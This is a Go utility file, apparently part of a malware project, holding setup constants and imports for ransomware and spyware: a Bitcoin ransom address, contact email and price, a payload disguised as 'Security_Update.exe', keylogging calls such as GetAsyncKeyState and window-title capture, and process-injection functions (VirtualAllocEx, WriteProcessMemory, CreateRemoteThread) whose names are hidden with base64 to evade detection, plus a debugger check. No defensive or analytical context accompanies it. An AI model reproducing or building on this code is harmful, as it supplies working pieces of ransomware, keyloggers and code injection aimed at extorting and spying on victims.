package utils

import "syscall"
import "../base64"

const BTC_ADDRESS = "1W4t3596k4ijyihjgohol"
const EMAIL = "example@company.com"
const PRICE = 600
const TARGET_FILE_NAME = "Security_Update.exe"
const MEM_COMMIT = 0x1000
const MEM_RESERVE = 0x2000
const PAGE_EXECUTE_READWRITE = 0x40
const PROCESS_CREATE_THREAD = 0x0002
const PROCESS_QUERY_INFORMATION = 0x0400
const PROCESS_VM_OPERATION = 0x0008
const PROCESS_VM_WRITE = 0x0020
const PROCESS_VM_READ = 0x0010

var User32 = syscall.NewLazyDLL("user32.dll")
var ProcGetAsyncKeyState = User32.NewProc("GetAsyncKeyState")
var ProcGetForegroundWindow = User32.NewProc("GetForegroundWindow") //GetForegroundWindow
var ProcGetWindowTextW = User32.NewProc("GetWindowTextW")           //GetWindowTextW
var TmpKeylog string

var K32 = syscall.MustLoadDLL(base64.Base64Decode("a2VybmVsMzIuZGxs"))
var USER32 = syscall.MustLoadDLL(base64.Base64Decode("dXNlcjMyLmRsbA=="))
var GetAsyncKeyState = USER32.MustFindProc(base64.Base64Decode("R2V0QXN5bmNLZXlTdGF0ZQ=="))
var VirtualAlloc = K32.MustFindProc(base64.Base64Decode("VmlydHVhbEFsbG9j"))
var CreateThread = K32.MustFindProc(base64.Base64Decode("Q3JlYXRlVGhyZWFk"))
var WaitForSingleObject = K32.MustFindProc(base64.Base64Decode("V2FpdEZvclNpbmdsZU9iamVjdA=="))
var VirtualAllocEx = K32.MustFindProc(base64.Base64Decode("VmlydHVhbEFsbG9jRXg="))
var CreateRemoteThread = K32.MustFindProc(base64.Base64Decode("Q3JlYXRlUmVtb3RlVGhyZWFk"))
var GetLastError = K32.MustFindProc(base64.Base64Decode("R2V0TGFzdEVycm9y"))
var WriteProcessMemory = K32.MustFindProc(base64.Base64Decode("V3JpdGVQcm9jZXNzTWVtb3J5"))
var OpenProcess = K32.MustFindProc(base64.Base64Decode("T3BlblByb2Nlc3M="))
var IsDebuggerPresent = K32.MustFindProc(base64.Base64Decode("SXNEZWJ1Z2dlclByZXNlbnQ="))
